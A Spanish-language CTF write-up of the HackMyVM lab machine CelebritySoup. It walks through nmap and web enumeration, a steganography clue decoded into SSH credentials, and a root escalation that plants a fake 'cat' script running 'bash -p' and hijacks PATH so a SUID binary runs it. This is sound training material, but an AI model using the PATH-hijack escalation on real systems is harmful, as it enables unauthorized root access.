---
layout      : post
title       : "CelebritySoup - HackMyVm"
author      : elc4br4
image       : assets/images/HMV/Celebritysoup-HackMyVM/Celebritysoup.webp
category    : [ HackMyVM ]
tags        : [ Linux ]
---

Esta vez tenemos la máquina CelebritySoup nivel Easy creada por ShellDredd, en la que tendremos un poco de todo, una "larga" enumeración web con cositas muy chulas en cuanto al diseño del CTF, un poco de stego y una escalada bien sencilla tirando de un SUID y jugando un poco con la variable PATH.

Canal de ShellDredd Informática --> [https://www.youtube.com/c/ShellDreddInform%C3%A1tica](https://www.youtube.com/c/ShellDreddInform%C3%A1tica)

# Reconocimiento de Puertos

Comienzo escaneando puertos, como de costumbre.

![](/assets/images/HMV/Celebritysoup-HackMyVM/rustcan.webp)

Escaneo más avanzado de versiones y servicios.

```nmap
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:8f:44:53:04:a9:81:ac:f9:3c:4d:6f:c6:bd:61:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCWD3FxSjZsVitvLh+T2H7YXugTHxEEmebRbiiJFDt5BFm+hfELTOCeoQLVNd2GaqYr8sD0GGz5lc7npxfE7Q0xSL6y0HCsEQC/zzmfmPwscqYJV+fk6mwAt8lAh537OB00YZtmt/67kUgW3Xd9udhvT1MiLdk0WNRcjtMotgzs9a0gXk1CUEery/w7pa5CxM9F4uFJ0EclV6Dzdga31ZldU2QqkJWgT1XzDZHYjTEA92GN7kES1stUz/PygGU7C6gXzmTuiBHw9kmdAfzG+KyJUAKt2wZaxqWrNWml7Nwy1iHKCTmrlfkFkwxJ+5Glh3SWVRor0x/8fVRLzuSwvXDX
|   256 fb:12:87:90:45:1c:8b:b7:23:86:aa:a7:2f:be:80:f0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOCjQeru+5a3+VqyTvVo6JZC4aIResbTMoq3J+G3EObG+ic+EycPH92coD1VMS8PMxpW8Bp3lHdbQOV8NJ8eYLE=
|   256 d4:e3:36:6c:d0:20:c3:5b:2d:c6:c5:6b:28:be:f6:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDOruj2FYzeb0QWZZH4K3dcPk04F0iGMvU8iBK5c2l1R
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Section 9
|_http-favicon: Unknown favicon MD5: DE02BF0388A5D040B61481AE073E693D
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos lo siguiente:

> Puerto 21 , 22 , 80 abiertos.

Probé si tenía acceso anónimo el servidor ftp pero no, asique supongo que debemos encontrar credenciales válidas.

Procedo a enumerar el servidor web.


# Enumeración Web

Abro el navegador y accedo al servidor web.

![](/assets/images/HMV/Celebritysoup-HackMyVM/web1.webp)

De primeras no hay nada, y en el código fuente tampoco veo nada que me pueda servir, de forma que procedo a enumerar rutas en el servidor.

![](/assets/images/HMV/Celebritysoup-HackMyVM/feroxbuster.webp)

Como se puede ver, hay varias rutas, pero la que más me llama la atención es el archivo robots.txt, asique voy a ver que tenemos.

![](/assets/images/HMV/Celebritysoup-HackMyVM/robots.webp)

Parece que tenemos varios archivos con extensión html, asique los reviso uno a uno, y a simple vista no parece nada importante, pero revisando el código fuente de los archivos sector(1-10) veo algo raro.

En cada archivo tenemos este patrón que se repite en los demás.

```secret
<div secret1="pu"></div>
<div secret2="pp"></div>
<div secret3="et"></div>
<div secret4="ma"></div>
<div secret5="st"></div>
<div secret6="er"></div>
```
Si unimos estas pistas, encontramos la palabra puppetmaster que podría ser un usuario o una contraseña, pero aún no lo sabemos a ciencia cierta.

En el archivo sector9.html encuentro una especie de artículo

![](/assets/images/HMV/Celebritysoup-HackMyVM/web2.webp)

Al ver que el archivo sector9.html es diferente a los más, pienso que dentro ha de haber una ruta o alguna pista que podría ayudarme a continuar.

Asique voy a probar a crear un diccionario con el contenido de la página usando la herramienta cewl.

> `cewl --with-numbers http://192.168.0.15/sector9.html > diccionario_web.txt`

Una vez generado el diccionario voy a fuzzear en busca de rutas.

![](/assets/images/HMV/Celebritysoup-HackMyVM/feroxbuster2.webp)

Tenemos la ruta project2501.html, asique vamos a ver que hay.

![](/assets/images/HMV/Celebritysoup-HackMyVM/project2501.png)

Puede que la información este escondida dentro de la imágen, pero no me deja descargarla, asique buscando en el código fuente encuentro una fuga en el código web, modding.css

`<link href="modding.css" rel="stylesheet">`

Y encontramos la ruta de la imágen, que ya la podremos descargar y analizarla.

![](/assets/images/HMV/Celebritysoup-HackMyVM/css.webp)

La descargo y analizo con exiftool.

![](/assets/images/HMV/Celebritysoup-HackMyVM/exiftool.webp)

Pero no hay nada oculto... Aunque estoy seguro que hay algo en la imágen, ya que no hay otro hilo del que tirar.

![](/assets/images/HMV/Celebritysoup-HackMyVM/sector10.gif)

A través de una herramienta de esteganografía online adjunto la imágen y me da una cadena encodeada en binario... podría ser un mensaje...

```binary
0110010001101001011001110110100101110100011000010110110000101101011000100111001001100001011010010110111000101101011010010111001100101101011101000111001001100001011011100111001101100011011001010110111001100100011010010110111001100111
```

Lo desencripto:

![](/assets/images/HMV/Celebritysoup-HackMyVM/binary.webp)

Parece una contraseña, alomejor podemos conectarnos a través de ssh usando el usuario puppetmaster y la contraseña digital-brain-is-transcending

![](/assets/images/HMV/Celebritysoup-HackMyVM/ssh.webp)

Hemos tenido userte, las credenciales eran válidas.

Ahora ya puedo leer la flag user.txt, por lo tanto ya pasamos a la parte de escalar privilegios.

![](/assets/images/HMV/Celebritysoup-HackMyVM/user.webp)

# Escalada de Privilegios

Como de costumbre para escalar privilegios primero debemos enumerar para encontrares posibles vectores de escalada.

Antes de nada tenemos en el directorio donde se aloja la flag user.txt un archivo llamado `systeminfo`.

> `-rwsr-xr-x 1 root         root         16712 ene  6  2021 systeminfo`

El archivo systeminfo tiene privilegios SUID, asique voy a ver que contiene este archivo en su interior.

![](/assets/images/HMV/Celebritysoup-HackMyVM/escalada1.webp)

Si nos fijamos tenemos rutas absolutas, excepto en la línea `cat /etc/*release` donde el cat en vez de definirse como /usr/bin/cat se define como cat solamente.

Podríamos aprovecharnos del cat para escalar privilegios, creando un archivo llamado cat añadiéndole cierto contenido en su interior, después lo colocamos en la variable de entorno para que al ejecutar el systeminfo ejecute nuestro cat modificado, por lo tanto ejecute el contenido de su interior.

Lo mostaré paso por paso y lo entenderéis mejor:
 
> Creamos el archivo cat 

`puppetmaster@CelebritySoup:~$ touch cat`

> Añadimos el contenido dentro del archivo

```bash
puppetmaster@CelebritySoup:~$ echo "bash -p" > cat
puppetmaster@CelebritySoup:~$ cat cat
bash -p
```
> Le asiganos permisos de ejecución

`chmod +x cat`

> Lo añadimos la ruta a la variable de entorno PATH

`export PATH=/home/puppetmaster/:$PATH`

> Ejecutamos el archivo systeminfo

```bash
puppetmaster@CelebritySoup:~$ ./systeminfo 


root
uid=0(root) gid=1000(puppetmaster) grupos=1000(puppetmaster),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
CelebritySoup
```

![](/assets/images/HMV/Celebritysoup-HackMyVM/root.webp)

Y ya podemos leer la flag root

![](/assets/images/HMV/Celebritysoup-HackMyVM/root1.webp)
